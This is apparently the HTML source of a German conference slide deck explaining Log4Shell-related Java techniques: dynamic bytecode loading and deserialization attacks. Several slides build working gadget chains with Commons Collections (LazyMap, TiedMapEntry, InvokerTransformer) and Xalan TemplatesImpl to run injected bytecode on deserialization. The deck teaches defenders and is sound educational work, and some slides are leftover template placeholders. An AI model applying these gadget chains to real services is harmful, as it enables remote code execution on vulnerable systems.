<!doctype html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>diva-e - Die Technik hinter Log4Shell & Co.</title>

    <link rel="stylesheet" href="/node_modules/reveal.js/dist/reset.css">
    <link rel="stylesheet" href="/node_modules/reveal.js/dist/reveal.css">
    <link rel="stylesheet" href="theme/diva-e.css">

    <!-- Theme used for syntax highlighted code -->
    <link rel="stylesheet" href="/node_modules/highlight.js/styles/intellij-light.css">

</head>
<body>
<div class="reveal">
    <div class="slides">

        <section class="title">
            <div class="header"></div>
            <div class="content">
                <h1>Die Technik hinter Log4Shell & Co.</h1>
                <p><small>Christoph Wende und Christian Kumpe, 17. Mai 2022, Entwicklertag Karlsruhe</small></p>
            </div>
        </section>

        <section>
            <div class="header">Prästentationstitel - Kapitel</div>
            <div class="content">
                <h2>Agenda</h2>
                <ol>
                    <li>Ich bin ein Blindtext.</li>
                    <li>Ich bin ein Blindtext.</li>
                    <li>
                        Ich bin ein Blindtext.
                        <ul>
                            <li>Es hat lange gedauert, bis ich begriffen habe, was es bedeutet, ein blinder Text zu sein.</li>
                            <li>Man macht keinen Sinn. Man wirkt hier und da aus dem Zusammenhang gerissen. Oft wird man gar nicht erst gelesen.</li>
                            <li>Aber bin ich deshalb ein schlechter Text? Ich weiss, dass ich nie die Chance haben werde, im Stern zu erscheinen. Aber bin ich darum weniger
                                wichtig? Ich bin blind!
                            </li>
                        </ul>
                    </li>
                    <li>Ich bin ein Blindtext.</li>
                </ol>
            </div>
        </section>

        <section>
            <div class="header">Prästentationstitel - Kapitel</div>
            <div class="content">
            <pre><code data-line-numbers="3-5|8-10|13-15">@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@SpringBootTest
@ActiveProfiles
public @interface SpringBootIntegrationTest {
    @AliasFor(annotation = ActiveProfiles.class, attribute = "profiles") String[] activeProfiles() default {"test"};
}
</code></pre>
            </div>
        </section>

        <!--
            Schritt 1: Nachladen von Bytecode (Christoph)
        -->

        <section class="magenta">
            <div class="header"></div>
            <div class="content">
                <h1>Nachladen von Bytecode</h1>
            </div>
        </section>

        <section>
            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
            <div class="content">
                <h1>Unser Testcase:</h1>
                <pre><code data-line-numbers="|3-5" class="java">public class Step1_HelloWorld {

  static {
    System.out.println("Static initializer of Step1_HelloWorld");
  }

  public static void main(String[] args) {
    System.out.println("Hello KET2022!");
  }

}
            </code></pre>
              <div class="fragment">
                <p>Ausgabe des Beispiels:</p>
                <pre class="output"><code data-trim class="console">
Static initializer of Step1_HelloWorld
Hello KET2022!
                    </code></pre>
                <p>
                <br />
                </div>
                <div class="fragment">
                  <p>
                    Laut JLS <b>12.4. Initialization of Classes and Interfaces</b>
                    <br />
                    <br />
                    <em>Initialization of a class consists of executing its static initializers and the initializers for static fields (class variables) declared in the class. </em>
                  </p>
                </p>
              </div>
            </div>
        </section>

        <section>
            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
            <div class="content">
                <h1>Wie kommt der Code in den ClassLoader?</h1>
                <pre><code data-line-numbers="|6|8-9" class="java">import java.lang.reflect.Method;

public class Step2_ClassForName {

  public static void main(String[] args) throws Exception {
    Class&lt;?> helloWorldClass = Class.forName("com.divae...Step1_HelloWorld");

    Method mainMethod = helloWorldClass.getMethod("main", String[].class);
    mainMethod.invoke(null, (Object) new String[0]);
  }

}
            </code></pre>
              <div class="fragment">
                <p>Ausgabe des Beispiels:</p>
                <pre class="output"><code data-trim class="console">
Static initializer of Step1_HelloWorld
Hello KET2022!
                    </code></pre>
              </div>
            </div>
        </section>

        <section>
            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
            <div class="content">
                <h1>Und wenn der Code nicht im Classpath liegt?</h1>

                <pre><code data-trim data-line-numbers="|8|8,10|10,12-13|10|10,16-20" class="java">import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;

public class Step3_ClassForBytes {

  public static void main(String[] args) throws Exception {
    byte[] bytes = Files.readAllBytes(new File("target/classes/.../Step1_HelloWorld.class").toPath());

    Class&lt;?> helloWorldClass = new OverloadedClassLoader().defineClass(bytes);

    Method mainMethod = helloWorldClass.getMethod("main", String[].class);
    mainMethod.invoke(null, (Object) new String[0]);
  }

  private static class OverloadedClassLoader extends ClassLoader {
    Class&lt;?> defineClass(byte[] bytes) {
      return defineClass(null, bytes, 0, bytes.length, null);
    }
  }
}
            </code></pre>
               <div class="fragment">
                <p>Ausgabe des Beispiels:</p>
                <pre class="output"><code data-trim class="console">
Static initializer of Step1_HelloWorld
Hello KET2022!
                </code></pre>
              </div>
            </div>
        </section>

      <section>
        <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
        <div class="content">
          <h1>java --version</h1>



        </div>
      </section>
        <!--
            Schritt 2: Verbesserter Angriff über Deserialization (Christian)
        -->

        <section class="magenta">
            <div class="header"></div>
            <div class="content">
                <h1>Advanced Attack with Deserialization</h1>
            </div>
        </section>

        <section>
            <div class="header">Log4Shell &mdash; Verbesserter Angriff über Deserialization</div>
            <div class="content">
                <h2>Warum?</h2>
                <ul>
                    <li>Funktioniert auch mit JDK > 8u...</li>
                    <li>Muss aber LDAP Server erreichen können.</li>
                </ul>
                <h2>Wie?</h2>
                <ul>
                    <li>Bytecode für Payload in Daten verpacken.</li>
                </ul>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Serialisierung in Java</div>
            <div class="content">
                <h1>Daten mit Java Serialisieren und Deserialisieren</h1>
                <pre class="code"><code data-trim data-line-numbers="5-10|14-16|18-24|26-33" class="java">
import java.io.*;

public class SerializationBasics {

    // Serialisierbare Klasse
    public static class SerializableClass implements Serializable {

        private int value = 0;

    }

    public static void main(String[] args) throws Exception {

        // Objekt erzeugen und Wert zuweisen
        SerializableClass serializableObject = new SerializableClass();
        serializableObject.value = 1;

        // Objekt in Datei schreiben
        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
             ObjectOutputStream out = new ObjectOutputStream(file)) {

            out.writeObject(serializableObject);

        }

        // Objekt aus Datei lesen und Wert anzeigen
        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
             ObjectInputStream in = new ObjectInputStream(file)) {

            SerializableClass deserializedObject = (SerializableClass) in.readObject();
            System.out.println("Eingelesener Wert: " + deserializedObject.value);

        }

    }

}
                </code></pre>
                <div class="fragment">
                    <p>Ausgabe des Beispiels:</p>
                    <pre class="output"><code data-trim class="console">
Eingelesener Wert: 1
                </code></pre>
                </div>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Serialisierung in Java</div>
            <div class="content">
                <h1>Eigenen Code bei der Serialisierung ausführen</h1>
                <pre class="code"><code data-trim data-line-numbers="5-18|22-34" class="java">
import java.io.*;

public class SerializationBasics {

    // Klasse mit eigener Serialisierungslogik
    public static class SerializableClass implements Serializable {

        private int value = 0;

        private void writeObject(ObjectOutputStream out) {
            System.out.println("writeObject wird ausgeführt");
        }

        private void readObject(ObjectInputStream in) {
            System.out.println("readObject wird ausgeführt");
        }

    }

    public static void main(String[] args) throws Exception {

        SerializableClass serializableObject = new SerializableClass();
        serializableObject.value = 1;

        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
             ObjectOutputStream out = new ObjectOutputStream(file)) {
            out.writeObject(serializableObject);
        }

        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
             ObjectInputStream in = new ObjectInputStream(file)) {
            SerializableClass deserializedObject = (SerializableClass) in.readObject();
            System.out.println("Eingelesener Wert: " + deserializedObject.value);
        }

    }

}
                </code></pre>
                <div class="fragment">
                    <p>Ausgabe des Beispiels</p>
                    <pre class="output"><code data-trim class="console">
writeObject wird ausgeführt
readObject wird ausgeführt
Eingelesener Wert: 0
                </code></pre>
                </div>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
            <div class="content">
                <h1>Wie funktioniert ein Angriff über die Deserialisierung in Java?</h1>
                <ul>
                    <li>
                        Ziel eines Angriffs
                        <ul>
                            <li>Eigenen Code in der Java Anwendung einschleusen und ausführen.</li>
                            <li>In unserem Fall über serialisierte Daten.</li>
                        </ul>
                    </li>
                    <li>
                        Der Weg zum Ziel
                        <ol>
                            <li>Objekte geschickt kombinieren und serialisieren.</li>
                            <li>Serialisierte Daten („Payload“) über <em>log4shell</em> Lücke in die Anwendung übertragen.</li>
                            <li>Objekte werden deserialisiert und dabei der eigene Code instanziiert und ausgeführt.</li>
                        </ol>
                    </li>
                </ul>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
            <div class="content">
                <h1>Eine HashMap als Ausgangspunkt</h1>
                <p>Eine HashMap serialisiert nicht ihre interne Datenstruktur sondern direkt ihre Schlüssel und Einträge. Beim Deserialisieren werden diese wieder in die interne
                    Datenstruktur eingefügt.</p>
                <pre><code data-trim data-line-numbers="9,12,14,20">
package java.util;

public class HashMap&lt;K,V> extends AbstractMap&lt;K,V>
    implements Map&lt;K,V>, Cloneable, Serializable {
…
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
            …
            // Die Einträge werden aus dem ObjectInputStream gelesen und eingefügt
            for (int i = 0; i < mappings; i++) {
                …
                K key = (K) s.readObject();
                V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
    }
…
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
…
}
                </code></pre>
                <p class="fragment">Damit kann die <code>.hashCode()</code> Implementierung serialisierbarer Klassen getriggert werden.</p>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
            <div class="content">
                <h1>Beliebige Methode im Classpath ausführen</h1>
                <p>Über die geschickte Kombination verschiedener Features von Commons Collections können beim Deserialisieren beliebige Methoden im Classpath ausgeführt werden.</p>
                <pre class="code"><code data-trim data-line-numbers="13-19|23-31|33-39|41-49">
import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CallingAnArbitraryConstructorOnDeserialization {

    public static class SerializableClass implements Serializable {

        public void myMethod() {
            System.out.println("myMethod wird ausgeführt");
        }

    }

    public static void main(String[] args) throws Exception {

        // Objekt erzeugen
        SerializableClass serializableObject = new SerializableClass();

        // Instantiiert die übergebene Klasse mit einem Konstruktur mit der angegebenen Signatur und den Parametern
        InvokerTransformer invokerTransformer = new InvokerTransformer<>("myMethod", new Class[0], new Object[0]);

        // Ruft den invokerTransformer zum Erzeugen nicht vorhandener Einträge auf
        LazyMap lazyMap = LazyMap.lazyMap(new HashMap(), invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, serializableObject);

        // Erzeuge eine HashMap mit 1 Eintrag
        Map hashMap = new HashMap();
        hashMap.put("this key will be replaces by tiedMapEntry", "a value");

        // Ersetzte den Schlüssel des Eintrags über Reflection
        Object firstMapEntry = hashMap.entrySet().iterator().next();
        ReflectionUtil.setFieldValue(firstMapEntry, "key", tiedMapEntry);

        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
             ObjectOutputStream out = new ObjectOutputStream(file)) {
            out.writeObject(hashMap);
        }

        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
             ObjectInputStream in = new ObjectInputStream(file)) {
            in.readObject();
        }

    }

}
                </code></pre>
                <div class="fragment">
                    <p>Ausgabe des Beispiels:</p>
                    <pre class="output"><code data-trim class="console">
myMethod wird ausgeführt
                </code></pre>
                </div>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
            <div class="content">
                <h1>Klasse aus serialisierten Daten instantiieren</h1>
                <p>In Kombination mit dem vorherigen Kniff, lässt sich mit eine Klasse der XSLT Bibliothek Apache Xalan eine eigene Klasse aus serialisierten Daten
                    initialisieren.</p>
                <pre class="code"><code data-trim data-line-numbers="11-12|14-18|20-27,31|29-30">
import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.io.*;
import java.nio.file.Files;

public class Step4_InstantiatingClassFromSerializedData {

    public static void main(String[] args) throws Exception {

        // Bytecode der auf dem Zielsystem ausgeführt werden soll
        byte[] classBytes = Files.readAllBytes(new File("target/test-classes/com/divae/talks/log4shell/TransletPayload.class").toPath());

        TemplatesImpl templates = new TemplatesImpl();
        // Füge Bytecode in templates Objekt ein
        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        // Damit beim Deserialisieren nicht zu früh eine NullPointerException auftritt
        ReflectionUtil.setFieldValue(templates, "_name", "");

        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
             ObjectOutputStream out = new ObjectOutputStream(file)) {
            out.writeObject(templates);
        }

        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
             ObjectInputStream in = new ObjectInputStream(file)) {
            TemplatesImpl deserializedTemplates = (TemplatesImpl) in.readObject();

            // Wird dann am Ende durch den Kniff im vorherigen Beispiel ersetzt
            deserializedTemplates.newTransformer();
        }

    }

}
                </code></pre>
                <div class="fragment">
                    <p>Ausgabe des Beispiels:</p>
                    <pre class="output"><code data-trim class="console">
Payload in static initializer of TransletPayload
Exception in thread "main" java.lang.NullPointerException
	at …
                    </code></pre>
                    <p>Den Fehler kann „getrost“ ignoriert werden, da der gewünschte Code bereits ausgeführt wurde.</p>
                </div>
            </div>
        </section>

        <section>
            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
            <div class="content">
                <h1>Eine HashMap als Ausgangspunkt</h1>
                <pre><code data-trim data-line-numbers="6-9">
public class Blx {

    public static void main(String[] args) throws Exception {

        LazyMap lazyMap = LazyMap.lazyMap(emptyMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "non existing key");

        // Triggert die Initialisierung
        tiedMapEntry.hashCode();

    }

}
                </code></pre>
            </div>
        </section>

        <!--
            Fazit
        -->

        <section class="blue">
            <div class="header"></div>
            <div class="content">
                <h1>Kapitel/Trennseite</h1>
            </div>
        </section>

        <section class="gold">
            <div class="header"></div>
            <div class="content">
                <h1>Kapitel/Trennseite</h1>
            </div>
        </section>

        <section class="gray">
            <div class="header"></div>
            <div class="content">
                <h1>Kapitel/Trennseite</h1>
            </div>
        </section>

        <section class="thanks">
            <div class="header">
                <h1>diva-e. You can’t buy it. You can’t make it.<br>
                    And you sure can’t fake it.</h1>
            </div>
            <div class="content">
                <h1>Danke</h1>
                <p>Bitte gebt uns Feedback!</p>
            </div>
            <div class="footnote">
                <p>Copyright © diva-e
                <p>Alle Angaben basieren auf dem derzeitigen Kenntnisstand. Änderungen vorbehalten. Dieses Dokument der diva-e Digital Value Excellence GmbH ist ausschließlich für
                    den Adressaten bzw. Auftraggeber bestimmt. Es bleibt bis zu einer ausdrücklichen Übertragung von Nutzungsrechten Eigentum der diva-e. Jede Bearbeitung,
                    Verwertung, Vervielfältigung und/oder gewerbsmäßige Verbreitung des Werkes ist nur mit Einverständnis von diva-e zulässig.
                <p>All content is based on the current state of communication. Subject to change. This document of diva-e Digital Value Excellence GmbH is only intended for the
                    client. It belongs to diva-e until its explicit transfer of usage rights. Any adaptation, utilization, copy and/or professional spreading has to be approved by
                    diva-e.
            </div>
        </section>

    </div>
</div>

<script type="module">

    import Reveal from '/node_modules/reveal.js/dist/reveal.esm.js';
    import Markdown from '/node_modules/reveal.js/plugin/markdown/markdown.esm.js';
    import Highlight from '/node_modules/reveal.js/plugin/highlight/highlight.esm.js';

    // More info about initialization & config:
    // - https://revealjs.com/initialization/
    // - https://revealjs.com/config/
    Reveal.initialize({
        width: 1500,
        height: 843,
        margin: 0.05,
        hash: true,
        slideNumber: true,

        // Learn about plugins: https://revealjs.com/plugins/
        plugins: [Markdown, Highlight]
    });
</script>
</body>
</html>
